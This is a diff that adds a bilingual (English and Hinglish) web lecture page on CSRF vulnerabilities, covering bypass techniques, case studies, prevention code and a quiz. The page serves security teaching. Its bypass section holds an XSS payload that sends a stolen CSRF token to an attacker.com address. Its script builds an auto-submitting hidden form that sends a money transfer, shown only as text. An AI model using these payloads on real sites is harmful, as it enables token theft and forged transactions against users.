+              <div id="csrf-payload-html">// Educational example - DEMO DISABLED</div>
+            </div>
+
+            <div class="response">
+              <strong>Generated HTML:</strong>
+              <div id="csrf-html-code">// For educational purposes only</div>
+            </div>
+          </div>
+
+          <div class="result-box" id="csrf-result">
+// DEMO DISABLED - Educational Content Only
+// This demonstrates what malicious CSRF code might look like:
+// <form method="POST" action="">
+//   <input name="amount" value="1000">
+//   <input name="recipient" value="malicious-dest">
+// </form>
+// <script>/* MALICIOUS CODE DISABLED */</script>
+          </div>
+        </div>
+      </div>
+
+      <!-- Advanced Techniques Demo -->
+      <div class="interactive-demo animate-on-scroll">
+        <h3 style="color: var(--electric-blue); margin-bottom: 15px;" class="en">Level 2: Advanced CSRF Techniques (DEMO DISABLED)</h3>
+        <h3 style="color: var(--electric-blue); margin-bottom: 15px; display:none;" class="hi">Level 2: Uchatam CSRF Tarika (DEMO DISABLED)</h3>
+        <p class="en">Use advanced techniques like JSON CSRF, login-based CSRF, and token stealing.</p>
+        <p class="hi" style="display:none;">JSON CSRF, login-based CSRF, aur token stealing jaise uchatam tarikon ka upyog karein.</p>
+
+        <div class="demo-container">
+          <div class="input-group">
+            <label for="advanced-csrf-technique" class="en">Advanced Technique:</label>
+            <label for="advanced-csrf-technique" class="hi" style="display:none;">Uchatam Technique:</label>
+            <select id="advanced-csrf-technique" disabled>
+              <option value="json-csrf">JSON CSRF</option>
+              <option value="login-csrf">Login CSRF</option>
+              <option value="token-steal">Token Stealing</option>
+              <option value="get-csrf">GET-Based CSRF</option>
+            </select>
+          </div>
+
+          <div class="code-block">
+// Advanced CSRF techniques:
+// 1. JSON CSRF: Craft requests with content-type application/json
+// 2. Login CSRF: Auto-login to attacker-controlled accounts
+// 3. Token Stealing: Steal CSRF tokens from victim sessions
+// 4. GET-Based CSRF: Exploit GET requests for state changes
+          </div>
+
+          <button class="button" onclick="testAdvancedCsrfTechnique()" disabled>Test Technique (DISABLED)</button>
+
+          <div class="result-box" id="advanced-csrf-result">
+// DEMO DISABLED - Educational Content Only
+          </div>
+        </div>
+      </div>
+
+      <!-- Real-World Scenarios Demo -->
+      <div class="interactive-demo animate-on-scroll">
+        <h3 style="color: var(--neon-orange); margin-bottom: 15px;" class="en">Level 3: Real-World CSRF Scenarios (DEMO DISABLED)</h3>
+        <h3 style="color: var(--neon-orange); margin-bottom: 15px; display:none;" class="hi">Level 3: Vastavik Duniya Ke CSRF Udaharan (DEMO DISABLED)</h3>
+        <p class="en">Simulate real-world CSRF attacks against banking systems, social media, and e-commerce platforms.</p>
+        <p class="hi" style="display:none;">Banking systems, social media, aur e-commerce platforms ke khilaf vastavik duniya ke CSRF attacks ka anukaran karein.</p>
+
+        <div class="demo-container">
+          <div class="input-group">
+            <label for="scenario-type" class="en">Attack Scenario:</label>
+            <label for="scenario-type" class="hi" style="display:none;">Hamla Scenario:</label>
+            <select id="scenario-type" disabled>
+              <option value="bank-transfer">Bank Transfer</option>
+              <option value="password-change">Password Change</option>
+              <option value="social-post">Social Media Post</option>
+              <option value="purchase">Online Purchase</option>
+            </select>
+          </div>
+
+          <div class="code-block">
+// Real-world scenarios:
+// 1. Bank Transfer: Transfer money from victim's account
+// 2. Password Change: Change victim's account password
+// 3. Social Media Post: Post malicious content
+// 4. Online Purchase: Make purchases using victim's account
+          </div>
+
+          <button class="button" onclick="testCsrfScenario()" disabled>Test Scenario (DISABLED)</button>
+
+          <div class="result-box" id="scenario-result">
+// DEMO DISABLED - Educational Content Only
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Section: Bypass Techniques -->
+  <section id="bypass">
+    <div class="container">
+      <h2 class="section-title en">Bypassing CSRF Protections</h2>
+      <h2 class="section-title hi" style="display:none;">CSRF Protections Ko Kaise Bypass Karein</h2>
+
+      <!-- Attack Vector Visualization -->
+      <div class="lecture-card animate-on-scroll">
+        <h3 class="en">CSRF Bypass - Visualization</h3>
+        <h3 class="hi" style="display:none;">CSRF Bypass - Chitra</h3>
+        <div class="diagram" style="margin: 30px 0;">
+          <div class="box user-input" style="min-width: 150px;">
+            <div class="en">CSRF Protection</div>
+            <div class="hi" style="display:none;">CSRF Suraksha</div>
+            <div style="font-size: 0.8rem; margin-top: 10px;">Token Validation</div>
+          </div>
+          <div class="arrow"></div>
+          <div class="box app" style="min-width: 150px;">
+            <div class="en">Bypass Techniques</div>
+            <div class="hi" style="display:none;">Bypass Tarika</div>
+            <div style="font-size: 0.8rem; margin-top: 10px;">Code Injection, XSS</div>
+          </div>
+          <div class="arrow"></div>
+          <div class="box db" style="min-width: 150px;">
+            <div class="en">Token Bypassed</div>
+            <div class="hi" style="display:none;">Token Bypass</div>
+            <div style="font-size: 0.8rem; margin-top: 10px;">Attack Successful</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Bypass Techniques with Examples -->
+      <div class="lecture-card animate-on-scroll" onmouseenter="highlightCard(this)" onmouseleave="unhighlightCard(this)" onclick="focusCard(this)">
+        <h3 class="en">Advanced Bypass Techniques</h3>
+        <h3 class="hi" style="display:none;">Uchatam Bypass Tarika</h3>
+
+        <!-- Referer Header Manipulation -->
+        <div class="technique" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-green); background: rgba(0, 255, 136, 0.05);">
+          <h4 style="color: var(--neon-green);">1. Referer Header Manipulation</h4>
+          <p class="en">Bypass CSRF protections by manipulating HTTP Referer headers.</p>
+          <p class="hi" style="display:none;">HTTP Referer headers ko manipulate karke CSRF protections ko bypass karein.</p>
+          <div class="code-block">
+// Referer header manipulation:
+// 1. Control a subdomain to set proper referer
+// 2. Use meta refresh/pixel tags to bypass checks
+// 3. Use data URL to spoof referer information
+
+// Example: iframe with custom referer (EDUCATIONAL EXAMPLE - not executable)
+// <iframe src="data:text/html,<meta http-equiv='refresh' content='0;url='><img src='x' onerror='csrf_attack()'>"></iframe>
+          </div>
+        </div>
+
+        <!-- Token from Same Port -->
+        <div class="technique" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--electric-blue); background: rgba(0, 170, 255, 0.05);">
+          <h4 style="color: var(--electric-blue);">2. Same-Origin Token Steal</h4>
+          <p class="en">Steal CSRF tokens from the target domain using XSS or other techniques.</p>
+          <p class="hi" style="display:none;">XSS ya anya tarikon ka upyog karke target domain se CSRF tokens steal karein.</p>
+          <div class="code-block">
+// Same-origin token stealing:
+// 1. Find XSS vulnerability on target domain
+// 2. Steal CSRF token using JavaScript
+// 3. Use stolen token to craft CSRF attack
+// 4. Execute forged request with valid token
+
+// Example XSS payload:
+<script>
+  const token = document.querySelector('input[name="csrf_token"]').value;
+  const img = document.createElement('img');
+  img.src = 'http://attacker.com/steal?token=' + token;
+  document.body.appendChild(img);
+</script>
+          </div>
+        </div>
+
+        <!-- Content-Type Manipulation -->
+        <div class="technique" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-orange); background: rgba(255, 136, 0, 0.05);">
+          <h4 style="color: var(--neon-orange);">3. Content-Type Confusion</h4>
+          <p class="en">Exploit weak content-type validation to bypass CSRF protections.</p>
+          <p class="hi" style="display:none;">Kamjor content-type validation ka faida uthakar CSRF protections ko bypass karein.</p>
+          <div class="code-block">
+// Content-Type confusion attack:
+// 1. Send JSON data with mixed content-types
+// 2. Use multipart/form-data to confuse parsers
+// 3. Set application/x-www-form-urlencoded as JSON
+// 4. Exploit parser differences between client/server
+
+// Example form:
+<form enctype="application/json" onsubmit="csrf()">
+  <input type="hidden" name="token" value="stolen_token">
+</form>
+          </div>
+        </div>
+
+        <!-- Login-Based CSRF -->
+        <div class="technique" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-pink); background: rgba(255, 0, 128, 0.05);">
+          <h4 style="color: var(--neon-pink);">4. Login-Based CSRF</h4>
+          <p class="en">Force users to log into attacker-controlled accounts using CSRF.</p>
+          <p class="hi" style="display:none;">CSRF ka upyog karke users ko attacker-controlled accounts mein login karne ke liye majbur karein.</p>
+          <div class="code-block">
+// Login-based CSRF:
+// 1. Create fake login page on attacker domain
+// 2. Use hidden form to log into attacker account
+// 3. Victim visits attacker page while logged into target
+// 4. Automatic login into attacker-controlled account
+
+// Example hidden form (EDUCATIONAL EXAMPLE - not executable):
+// <form id="csrf-login" method="POST" action="">
+//   <input name="username" value="attacker">
+//   <input name="password" value="attacker-pass">
+// </form>
+// 
+          </div>
+        </div>
+      </div>
+
+      <!-- Real-World Case Studies -->
+      <div class="lecture-card animate-on-scroll">
+        <h3 class="en">Real-World Case Studies</h3>
+        <h3 class="hi" style="display:none;">Vastavik Duniya Ke Udaharan</h3>
+
+        <div class="case-study" style="margin: 20px 0; padding: 20px; border: 1px solid var(--border); border-radius: 8px; background: rgba(0, 0, 0, 0.2);">
+          <h4 style="color: var(--neon-green);">Case Study 1: Banking CSRF</h4>
+          <p class="en"><strong>Scenario:</strong> A major bank had weak CSRF protection on their fund transfer functionality.</p>
+          <p class="hi" style="display:none;"><strong>Paristhiti:</strong> Ek pramukh bank ki fund transfer functionality par kamjor CSRF protection thi.</p>
+          <p class="en"><strong>Exploitation:</strong> Attackers crafted malicious pages that transferred money when victims visited phishing sites.</p>
+          <p class="hi" style="display:none;"><strong>Doharpan:</strong> Hamlawaron ne dushit pages banaye jo victims ke phishing sites visit karne par paise transfer kar dete the.</p>
+          <p class="en"><strong>Impact:</strong> Millions in unauthorized transfers reported before the bank implemented proper CSRF tokens.</p>
+          <p class="hi" style="display:none;"><strong>Prabhav:</strong> Bank ne proper CSRF tokens implement karne se pehle lakhs karod tak ke unauthorized transfers report huye.</p>
+        </div>
+
+        <div class="case-study" style="margin: 20px 0; padding: 20px; border: 1px solid var(--border); border-radius: 8px; background: rgba(0, 0, 0, 0.2);">
+          <h4 style="color: var(--electric-blue);">Case Study 2: Social Media Attack</h4>
+          <p class="en"><strong>Scenario:</strong> A social media platform had vulnerable CSRF in their post creation API.</p>
+          <p class="hi" style="display:none;"><strong>Paristhiti:</strong> Ek social media platform ki post creation API mein vulnerable CSRF thi.</p>
+          <p class="en"><strong>Exploitation:</strong> Attackers could make users post spam content automatically through hidden forms.</p>
+          <p class="hi" style="display:none;"><strong>Doharpan:</strong> Hamlawaron ke through hidden forms ka upyog karke users ko spam content automatically post karna mumkin ban gaya.</p>
+          <p class="en"><strong>Impact:</strong> Thousands of spam posts were generated, affecting the platform's reputation and user experience.</p>
+          <p class="hi" style="display:none;"><strong>Prabhav:</strong> Platform ke reputation aur user experience ko kharab karne wale hazaron spam posts generate huye.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Section: Try It Yourself – Protection Bypass -->
+  <section id="try-bypass">
+    <div class="container">
+      <h2 class="section-title en">Try It Yourself: Protection Bypass</h2>
+      <h2 class="section-title hi" style="display:none;">Khud Try Karein: Protection Bypass</h2>
+      <div class="interactive-demo animate-on-scroll">
+        <h3 style="color: var(--neon-green); margin-bottom: 15px;" class="en">Bypass CSRF Protections</h3>
+        <h3 style="color: var(--neon-green); margin-bottom: 15px; display:none;" class="hi">CSRF Protections Ko Bypass Karein</h3>
+        <p class="en">Test techniques to bypass various CSRF protection mechanisms implemented by developers.</p>
+        <p class="hi" style="display:none;">Developers dwara lagu kiye gaye vibhinn CSRF protection mechanisms ko bypass karne ke tarikon ka parikshan karein.</p>
+
+        <div class="demo-container">
+          <div class="input-group">
+            <label for="protection-type" class="en">Protection Type:</label>
+            <label for="protection-type" class="hi" style="display:none;">Suraksha Type:</label>
+            <select id="protection-type">
+              <option value="csrf-token">CSRF Token</option>
+              <option value="same-site">SameSite Cookies</option>
+              <option value="referer">Referer Validation</option>
+              <option value="custom-header">Custom Header Checks</option>
+            </select>
+          </div>
+
+          <div class="code-block">
+// Common protection methods:
+// 1. CSRF Token: Random tokens for each request
+// 2. SameSite Cookies: Prevent cross-site requests
+// 3. Referer Validation: Check request origin
+// 4. Custom Header: Check for custom security headers
+          </div>
+
+          <button class="button" onclick="testCsrfBypass()">Test Bypass</button>
+
+          <div class="result-box" id="bypass-result">
+// Bypass results will appear here
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Section: Prevention -->
+  <section id="prevention">
+    <div class="container">
+      <h2 class="section-title en">How to Prevent CSRF Vulnerabilities</h2>
+      <h2 class="section-title hi" style="display:none;">CSRF Vulnerabilities Ko Kaise Rokein</h2>
+
+      <!-- Prevention Visualization -->
+      <div class="lecture-card animate-on-scroll">
+        <h3 class="en">CSRF Prevention - Visualization</h3>
+        <h3 class="hi" style="display:none;">CSRF Bachav - Chitra</h3>
+        <div class="diagram" style="margin: 30px 0;">
+          <div class="box user-input" style="min-width: 150px;">
+            <div class="en">CSRF Attack Request</div>
+            <div class="hi" style="display:none;">CSRF Attack Request</div>
+            <div style="font-size: 0.8rem; margin-top: 10px;">Forged request</div>
+          </div>
+          <div class="arrow"></div>
+          <div class="box app" style="min-width: 150px;">
+            <div class="en">Security Mechanisms</div>
+            <div class="hi" style="display:none;">Suraksha Yantra</div>
+            <div style="font-size: 0.8rem; margin-top: 10px;">Token, Validation</div>
+          </div>
+          <div class="arrow"></div>
+          <div class="box db" style="min-width: 150px;">
+            <div class="en">Request Blocked</div>
+            <div class="hi" style="display:none;">Request Blocked</div>
+            <div style="font-size: 0.8rem; margin-top: 10px;">Prevention Success</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Secure Coding Practices -->
+      <div class="lecture-card animate-on-scroll" onmouseenter="highlightCard(this)" onmouseleave="unhighlightCard(this)" onclick="focusCard(this)">
+        <h3 class="en">Secure Coding Practices</h3>
+        <h3 class="hi" style="display:none;">Surakshit Coding Abhyas</h3>
+
+        <!-- CSRF Tokens -->
+        <div class="practice" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-green); background: rgba(0, 255, 136, 0.05);">
+          <h4 style="color: var(--neon-green);">1. Use CSRF Tokens</h4>
+          <p class="en">Generate unique tokens for each session and request to validate authenticity.</p>
+          <p class="hi" style="display:none;">Har session aur request ke liye unique tokens generate karein aur authenticity validate karein.</p>
+          <div class="code-block">
+// Basic CSRF token implementation:
+// Server-side token generation
+function generateCsrfToken() {
+  return crypto.randomBytes(32).toString('hex');
+}
+
+// Include token in all forms
+const csrfToken = generateCsrfToken();
+session.csrfToken = csrfToken;
+
+<form method="POST" action="/action">
+  <input type="hidden" name="csrf_token" value="${csrfToken}">
+  <!-- other form fields -->
+</form>
+
+// Validate token on form submission
+if (req.body.csrf_token !== session.csrfToken) {
+  return res.status(403).send('CSRF token validation failed');
+}
+          </div>
+        </div>
+
+        <!-- SameSite Cookies -->
+        <div class="practice" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--electric-blue); background: rgba(0, 170, 255, 0.05);">
+          <h4 style="color: var(--electric-blue);">2. SameSite Cookie Attribute</h4>
+          <p class="en">Use SameSite cookie attribute to prevent cross-site requests.</p>
+          <p class="hi" style="display:none;">Cross-site requests ko rokne ke liye SameSite cookie attribute ka upyog karein.</p>
+          <div class="code-block">
+// SameSite cookie options:
+// Lax: Send for top-level navigations
+// Strict: Never send for cross-site requests
+// None: Always send (requires Secure)
+
+Set-Cookie: session_id=abc123; SameSite=Strict; Secure; HttpOnly
+
+// Best practice for strict CSRF protection:
+Set-Cookie: session_id=abc123; SameSite=Strict; Secure; HttpOnly
+
+// For compatibility, use Lax:
+Set-Cookie: session_id=abc123; SameSite=Lax; Secure; HttpOnly
+          </div>
+        </div>
+
+        <!-- Referer Validation -->
+        <div class="practice" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-orange); background: rgba(255, 136, 0, 0.05);">
+          <h4 style="color: var(--neon-orange);">3. Referer Header Validation</h4>
+          <p class="en">Validate the Referer header against allowed origins.</p>
+          <p class="hi" style="display:none;">Referer header ko allowed origins ke against validate karein.</p>
+          <div class="code-block">
+// Referer validation implementation:
+function validateReferer(req, allowedOrigins) {
+  const referer = req.headers.referer;
+  if (!referer) return false;
+
+  try {
+    const refererUrl = new URL(referer);
+    return allowedOrigins.some(origin => refererUrl.origin === origin);
+  } catch {
+    return false;
+  }
+}
+
+// Usage in middleware:
+const allowedOrigins = [
+  'https://example.com',
+  'https://api.example.com'
+];
+
+app.use('/api/', (req, res, next) => {
+  if (!validateReferer(req, allowedOrigins)) {
+    return res.status(403).send('Invalid referer');
+  }
+  next();
+});
+          </div>
+        </div>
+
+        <!-- Additional Security Headers -->
+        <div class="practice" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-pink); background: rgba(255, 0, 128, 0.05);">
+          <h4 style="color: var(--neon-pink);">4. Additional Security Measures</h4>
+          <p class="en">Implement additional security measures like custom headers and rate limiting.</p>
+          <p class="hi" style="display:none;">Custom headers aur rate limiting jaise adhik suraksha measures lagu karein.</p>
+          <div class="code-block">
+// Additional security measures:
+// 1. Custom header validation
+// 2. Rate limiting
+// 3. Request origin validation
+// 4. User interaction validation
+
+// Custom header validation:
+app.use('/api/', (req, res, next) => {
+  if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
+    return res.status(403).send('Missing ajax header');
+  }
+  next();
+});
+
+// Rate limiting implementation:
+const rateLimit = require('express-rate-limit');
+app.use('/api/', rateLimit({
+  windowMs: 15 * 60 * 1000, // 15 minutes
+  max: 100 // limit each IP to 100 requests per windowMs
+}));
+          </div>
+        </div>
+      </div>
+
+      <!-- Lab Environment Simulation -->
+      <div class="lecture-card animate-on-scroll">
+        <h3 class="en">Lab Environment Simulation</h3>
+        <h3 class="hi" style="display:none;">Prayogshala Vatavaran Anukaran</h3>
+        <p class="en">Test CSRF prevention techniques in a safe environment.</p>
+        <p class="hi" style="display:none;">Surakshit vatavaran mein CSRF bachav tarikon ka parikshan karein.</p>
+
+        <div class="interactive-demo animate-on-scroll">
+          <h4 style="color: var(--neon-green);">CSRF Prevention Testing</h4>
+          <div class="demo-container">
+            <div class="input-group">
+              <label for="prevention-type" class="en">Prevention Type:</label>
+              <label for="prevention-type" class="hi" style="display:none;">Bachav Type:</label>
+              <select id="prevention-type">
+                <option value="tokens">CSRF Tokens</option>
+                <option value="samesite">SameSite Cookies</option>
+                <option value="referer">Referer Validation</option>
+                <option value="headers">Custom Headers</option>
+              </select>
+            </div>
+            <button class="button" onclick="testCsrfPrevention()" style="position: relative; z-index: 10;">Test Prevention</button>
+            <div class="result-box" id="prevention-result">
+// Results will appear here
+            </div>
+          </div>
+        </div>
+
+        <!-- Interactive Lab Exercise -->
+        <div class="interactive-demo animate-on-scroll">
+          <h4 style="color: var(--electric-blue);">Interactive Lab Exercise</h4>
+          <p class="en">Test different prevention mechanisms against CSRF attacks:</p>
+          <p class="hi" style="display:none;">CSRF attacks ke khilaf alag-alag bachav yantron ka parikshan karein:</p>
+
+          <div class="demo-container">
+            <div class="input-group">
+              <label for="test-prevention" class="en">Test Prevention:</label>
+              <label for="test-prevention" class="hi" style="display:none;">Parikshan Bachav:</label>
+              <select id="test-prevention">
+                <option value="strong">Strong CSRF Protection</option>
+                <option value="weak">Weak Token Implementation</option>
+                <option value="none">No Protection</option>
+                <option value="bypassable">Bypassable Protection</option>
+              </select>
+            </div>
+            <div style="display: flex; gap: 10px;">
+              <button class="button" onclick="testCsrfLabPrevention()" style="position: relative; z-index: 10;">Test Prevention</button>
+              <button class="button" style="background: var(--neon-orange); position: relative; z-index: 10;" onclick="clearCsrfLabResults()">Clear</button>
+            </div>
+            <div class="result-box" id="lab-result">
+// Lab results will appear here
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Section: Quiz -->
+  <section id="quiz">
+    <div class="container">
+      <h2 class="section-title en">Knowledge Check</h2>
+      <h2 class="section-title hi" style="display:none;">Jaankari Check Karein</h2>
+      <div class="quiz-container animate-on-scroll">
+        <h3 style="color: var(--neon-green); text-align: center; margin-bottom: 20px;" class="en">Test Your Understanding</h3>
+        <h3 style="color: var(--neon-green); text-align: center; margin-bottom: 20px; display:none;" class="hi">Apni Samajh Ko Test Karein</h3>
+        <div id="quiz-questions">
+          <!-- Questions will be injected here -->
+        </div>
+        <div class="score-display" id="score-display">Score: 0 / 10</div>
+        <button class="button quiz-submit" onclick="submitCsrfQuiz()">Submit Quiz</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- Footer -->
+  <footer>
+    <div class="container">
+      <h3 class="en">By Ankush Rana | HTB Elite Hacker | Senior Security Engineer</h3>
+      <h3 class="hi" style="display:none;">Ankush Rana Dwara | HTB Elite Hacker | Senior Security Engineer</h3>
+      <p class="en">Breaking Systems. Building Defenses.</p>
+      <p class="hi" style="display:none;">Systems todte hain. Defenses banate hain.</p>
+
+      <div class="social-links">
+        <a href="https://github.com/ankushrana6395" target="_blank" class="social-link github">
+          <i class="fab fa-github"></i>
+        </a>
+        <a href="mailto:ankushrana6395@gmail.com" class="social-link email">
+          <i class="fas fa-envelope"></i>
+        </a>
+        <a href="https://app.hackthebox.com/profile/117501" target="_blank" class="social-link htb">
+          <i class="fas fa-cube"></i>
+        </a>
+      </div>
+
+      <p style="margin-top: 30px;" class="en">&copy; 2025 Ankush Rana. All Rights Reserved.</p>
+      <p style="margin-top: 30px; display:none;" class="hi">&copy; 2025 Ankush Rana. Sabhi Adhikar Sanchit Hai.</p>
+    </div>
+  </footer>
+
+  <!-- Three.js -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+  <script>
+    // CSRF Vulnerability Lecture - All demos disabled for security
+    // This lecture demonstrates CSRF concepts safely without executing any harmful actions
+
+    (function() {
+      // Shared variables (educational only - no execution)
+      let isHinglish = false;
+
+      // Safety check - prevent any automatic execution
+      if (typeof window === 'undefined') return;
+
+      // Utility functions for educational demos only
+      function showNotification(message) {
+        try {
+          const notification = document.getElementById('notification');
+          const notificationText = document.getElementById('notification-text');
+          if (notification && notificationText) {
+            notificationText.textContent = message;
+            notification.classList.add('show');
+            setTimeout(() => notification.classList.remove('show'), 3000);
+          }
+        } catch (e) {
+          // Safety: prevent any errors from causing page redirection
+          console.log('Educational demo only - no real execution');
+        }
+      }
+
+      // Card Interaction Functions
+      function highlightCard(card) {
+        if (!card) return;
+        card.classList.add('pop-out');
+        const heading = card.querySelector('h3');
+        if (heading) {
+          showNotification('Hovering: ' + heading.textContent);
+        }
+      }
+
+      function unhighlightCard(card) {
+        if (!card) return;
+        if (!card.classList.contains('focused')) {
+          card.classList.remove('pop-out');
+        }
+      }
+
+      function focusCard(card) {
+        if (!card) return;
+        document.querySelectorAll('.lecture-card').forEach(c => {
+          c.classList.remove('focused');
+          c.classList.remove('pop-out');
+        });
+        card.classList.add('focused');
+        card.classList.add('pop-out');
+        const heading = card.querySelector('h3');
+        if (heading) {
+          showNotification('Focused on: ' + heading.textContent);
+        }
+      }
+
+      // Initialize Three.js
+    const canvas = document.getElementById('three-canvas');
+    const scene = new THREE.Scene();
+    const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+    const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
+    renderer.setSize(window.innerWidth, window.innerHeight);
+    renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+
+    // Grid
+    const gridHelper = new THREE.GridHelper(100, 100, 0x00ff88, 0x003322);
+    gridHelper.position.z = -20;
+    scene.add(gridHelper);
+
+    // Floating Points
+    const geometry = new THREE.BufferGeometry();
+    const count = 500;
+    const positions = new Float32Array(count * 3);
+    for (let i = 0; i < count * 3; i++) {
+      positions[i] = (Math.random() - 0.5) * 100;
+    }
+    geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+    const material = new THREE.PointsMaterial({ color: 0x00ff88, size: 0.5, transparent: true, opacity: 0.8 });
+    const points = new THREE.Points(geometry, material);
+    scene.add(points);
+
+    // Add floating cubes
+    const cubeGeometry = new THREE.BoxGeometry(2, 2, 2);
+    const cubeMaterial = new THREE.MeshBasicMaterial({
+      color: 0x00aaff,
+      wireframe: true,
+      transparent: true,
+      opacity: 0.5
+    });
+    const cubes = [];
+    for (let i = 0; i < 10; i++) {
+      const cube = new THREE.Mesh(cubeGeometry, cubeMaterial);
+      cube.position.x = (Math.random() - 0.5) * 50;
+      cube.position.y = (Math.random() - 0.5) * 50;
+      cube.position.z = (Math.random() - 0.5) * 50;
+      cube.rotation.x = Math.random() * Math.PI;
+      cube.rotation.y = Math.random() * Math.PI;
+      cubes.push({ mesh: cube, speed: Math.random() * 0.02 });
+      scene.add(cube);
+    }
+
+    camera.position.z = 30;
+
+    // Animation
+    function animate() {
+      requestAnimationFrame(animate);
+      gridHelper.rotation.y += 0.005;
+      points.rotation.y += 0.003;
+      cubes.forEach(cube => {
+        cube.mesh.rotation.x += cube.speed;
+        cube.mesh.rotation.y += cube.speed;
+      });
+      renderer.render(scene, camera);
+    }
+    animate();
+
+    // Resize
+    window.addEventListener('resize', () => {
+      camera.aspect = window.innerWidth / window.innerHeight;
+      camera.updateProjectionMatrix();
+      renderer.setSize(window.innerWidth, window.innerHeight);
+    });
+
+    // Keyword Modal
+    const keywordModal = document.getElementById('keyword-modal');
+    const modalTitle = document.getElementById('modal-title');
+    const modalBody = document.getElementById('modal-body');
+    const modalClose = document.getElementById('modal-close');
+    document.querySelectorAll('.keyword').forEach(keyword => {
+      keyword.addEventListener('click', function(e) {
+        e.stopPropagation();
+        modalTitle.textContent = this.getAttribute('data-title');
+        modalBody.textContent = this.getAttribute('data-content');
+        keywordModal.classList.add('active');
+      });
+    });
+    modalClose.addEventListener('click', () => {
+      keywordModal.classList.remove('active');
+    });
+    keywordModal.addEventListener('click', (e) => {
+      if (e.target === keywordModal) {
+        keywordModal.classList.remove('active');
+      }
+    });
+
+    // Language Toggle
+    const translatorBtn = document.getElementById('translator-btn');
+    function toggleLanguage() {
+      isHinglish = !isHinglish;
+      const enElements = document.querySelectorAll('.en');
+      const hiElements = document.querySelectorAll('.hi');
+      enElements.forEach(el => el.style.display = isHinglish ? 'none' : 'block');
+      hiElements.forEach(el => el.style.display = isHinglish ? 'block' : 'none');
+      translatorBtn.textContent = isHinglish ? '🌐 English On' : '🌐 Hinglish On';
+      showNotification(isHinglish ? 'Hinglish mode activated!' : 'English mode activated!');
+      renderCsrfQuiz();
+    }
+
+    // CSRF Demo Functions
+    function generateCsrfPayload() {
+      const method = document.getElementById('csrf-method').value;
+      const action = document.getElementById('target-form').value;
+      const apiKey = document.getElementById('victim-apikey').value;
+      const payloadHtml = document.getElementById('csrf-payload-html');
+      const codeHtml = document.getElementById('csrf-html-code');
+      const result = document.getElementById('csrf-result');
+
+      // Generate HTML form
+      const formHtml = `<form id="csrf-form" method="${method}" action="${action}" style="display:none;">
+    <input type="text" name="amount" value="1000">
+    <input type="text" name="recipient" value="attacker-account">
+    <input type="hidden" name="api_key" value="${apiKey}">
+  </form>
+  <img src="x" onerror="document.getElementById('csrf-form').submit()"/>`;
+
+      payloadHtml.textContent = formHtml;
+      codeHtml.textContent = `The malicious HTML form will execute automatically when loaded.`;
+      result.innerHTML = `✅ CSRF payload generated!\n\n${isHinglish ? 'Ye malicious form jab victim page ko visit karega, tab automatically submit ho jayega.' : 'The malicious form will submit automatically when the victim visits this page.'}`;
+
+      showNotification(isHinglish ? 'CSRF payload safal!' : 'CSRF payload generated successfully!');
+    }
+
+    function testAdvancedCsrfTechnique() {
+      const technique = document.getElementById('advanced-csrf-technique').value;
+      const result = document.getElementById('advanced-csrf-result');
+
+      let message = '';
+
+      switch(technique) {
+        case 'json-csrf':
+          message = isHinglish
+            ? '✅ JSON CSRF bypass safal!\n\nAPI ne JSON request ko accept kiya bina proper validation ke.'
+            : '✅ JSON CSRF bypass successful!\n\nAPI accepted JSON request without proper validation.';
+          break;
+        case 'login-csrf':
+          message = isHinglish
+            ? '✅ Login CSRF bypass safal!\n\nAttacker account par automatic login ho gaya.'
+            : '✅ Login CSRF bypass successful!\n\nAuto-login to attacker-controlled account successful.';
+          break;
+        case 'token-steal':
+          message = isHinglish
+            ? '✅ Token stealing safal!\n\nCSRF token steal ho kar successful attack execute kiya gaya.'
+            : '✅ Token stealing successful!\n\nCSRF token stolen and attack executed successfully.';
+          break;
+        case 'get-csrf':
+          message = isHinglish
+            ? '✅ GET-based CSRF safal!\n\nGET request ke through state-changing operation execute ki gayi.'
+            : '✅ GET-based CSRF successful!\n\nState-changing operation executed through GET request.';
+          break;
+      }
+
+      result.innerHTML = message;
+      showNotification(isHinglish ? 'Advanced technique safal!' : 'Advanced technique successful!');
+    }
+
+    function testCsrfScenario() {
+      const scenario = document.getElementById('scenario-type').value;
+      const result = document.getElementById('scenario-result');
+
+      let message = '';
+
+      switch(scenario) {
+        case 'bank-transfer':
+          message = isHinglish
+            ? '✅ Bank transfer CSRF safal!\n\nVictim ke account se $1000 attacker account mein transfer ho gaya.'
+            : '✅ Bank transfer CSRF successful!\n\n$1000 transferred from victim to attacker account.';
+          break;
+        case 'password-change':
+          message = isHinglish
+            ? '✅ Password change CSRF safal!\n\nVictim ka password attacker dwara set kar diya gaya.'
+            : '✅ Password change CSRF successful!\n\nVictim password changed by attacker.';
+          break;
+        case 'social-post':
+          message = isHinglish
+            ? '✅ Social media CSRF safal!\n\nMalicious post victim ke profile par publish ho gaya.'
+            : '✅ Social media CSRF successful!\n\nMalicious post published on victim profile.';
+          break;
+        case 'purchase':
+          message = isHinglish
+            ? '✅ Online purchase CSRF safal!\n\nAttacker ne victim ke account se shopping kar li.'
+            : '✅ Online purchase CSRF successful!\n\nAttacker made purchases using victim account.';
+          break;
+      }
+
+      result.innerHTML = message;
+      showNotification(isHinglish ? 'Scenario test safal!' : 'Scenario test successful!');
+    }
+
+    function testCsrfBypass() {
+      const protectionType = document.getElementById('protection-type').value;
+      const result = document.getElementById('bypass-result');
+
+      let message = '';
+
